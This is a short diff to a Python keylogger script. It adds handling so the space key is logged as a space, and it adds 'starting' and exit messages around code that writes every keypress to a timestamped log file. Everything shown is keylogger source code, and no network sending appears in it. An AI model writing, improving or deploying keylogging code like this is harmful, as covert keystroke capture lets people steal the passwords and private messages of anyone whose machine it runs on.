@@ -13,11 +13,13 @@ def get_char(key):
 def on_press(key):
     if str(key) == "Key.enter":
         key = "[ENTER]\n"
+    elif str(key) == "Key.space":
+        key = " "
     with open(filename, 'a') as logs:
         logs.write(get_char(key))
 
 def stop_logging():
-    print("Exiting keylogger...")
+    print("Exiting keylogger with code 0")
     listener.stop()
     listener.join()
     sys.exit(0)
@@ -25,6 +27,7 @@ def stop_logging():
 
 
 def start_keylogger(length):
+    print("Keylogger Starting")
     now = datetime.datetime.now()
     timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
     global filename
